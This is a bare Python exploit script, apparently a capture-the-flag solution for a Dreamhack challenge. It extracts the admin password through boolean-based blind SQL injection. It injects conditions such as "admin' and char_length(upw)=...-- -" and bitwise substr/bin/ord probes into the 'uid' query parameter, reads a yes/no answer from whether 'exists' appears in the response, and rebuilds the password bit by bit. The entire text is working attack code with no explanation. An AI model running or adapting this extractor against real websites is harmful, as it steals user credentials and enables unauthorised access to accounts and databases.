import requests

port = 16390
url_index = f"http://host1.dreamhack.games:{port}/"

# find length of password
pwd_length = 1
while True:
    temp = url_index
    temp += f"?uid=admin' and char_length(upw)={pwd_length}-- -"
    response = requests.get(temp)
    if "exists" in response.text:
        break
    pwd_length += 1


# find the length of bits of each character of password
bit_lengths = []
for i in range(pwd_length):
    bit_l = 0
    while True:
        temp = url_index
        temp += (
            f"?uid=admin' and length(bin(ord(substr(upw, {i + 1}, 1))))={bit_l} -- -"
        )
        response = requests.get(temp)
        if "exists" in response.text:
            break
        bit_l += 1
    bit_lengths.append(bit_l)


# find password in bit
pwd_in_bits = []
for i in range(pwd_length):
    bits = ""
    for j in range(bit_lengths[i]):
        temp = url_index
        temp += f"?uid=admin' and substr(bin(ord(substr(upw, {i + 1}, 1))), {j + 1}, 1)='0' -- -"
        response = requests.get(temp)
        if "exists" in response.text:
            bits += "0"
        else:
            bits += "1"
    pwd_in_bits.append(bits)


# find password
password = ""
for bit in pwd_in_bits:
    l = len(bit)
    password += int(bit, 2).to_bytes((l + 7) // 8, "big").decode("utf-8")

print(password)
